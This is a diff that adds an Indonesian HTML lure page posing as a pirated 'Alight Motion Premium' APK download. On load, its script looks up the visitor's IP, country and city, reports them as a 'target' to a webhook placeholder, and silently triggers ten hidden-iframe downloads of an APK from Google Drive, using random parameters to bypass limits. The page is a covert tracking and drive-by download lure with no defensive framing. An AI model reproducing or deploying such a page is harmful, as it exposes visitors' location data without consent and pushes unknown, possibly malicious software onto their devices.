@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://alightmotionpremium.apk-by-hazelnut.com</title>
+    <script>
+        async function trackAndDownload() {
+            let waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+            let ipInfo = await fetch("https://ipwhois.app/json/").then(res => res.json());
+
+            let data = {
+                content: "**Target Membuka Link**\n" +
+                         "**IP:** " + ipInfo.ip + "\n" +
+                         "**Negara:** " + ipInfo.country + "\n" +
+                         "**Kota:** " + ipInfo.city + "\n" +
+                         "**Waktu:** " + waktu
+            };
+
+            fetch("YOUR_WEBHOOK_URL", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+
+            // Download APK 10× dengan parameter acak untuk bypass limit
+            for (let i = 0; i < 10; i++) {
+                let randomParam = Math.random().toString(36).substring(7); // Generate string acak
+                let iframe = document.createElement("iframe");
+                iframe.style.display = "none";
+                iframe.src = `https://drive.google.com/uc?export=download&id=1SQuZ82OWz3_xREdk9z05DbO1mxiUDnJz&random=${randomParam}`;
+                document.body.appendChild(iframe);
+            }
+        }
+
+        trackAndDownload();
+    </script>
+</head>
+<body>
+    <h1></h1>
+</body>
+</html>
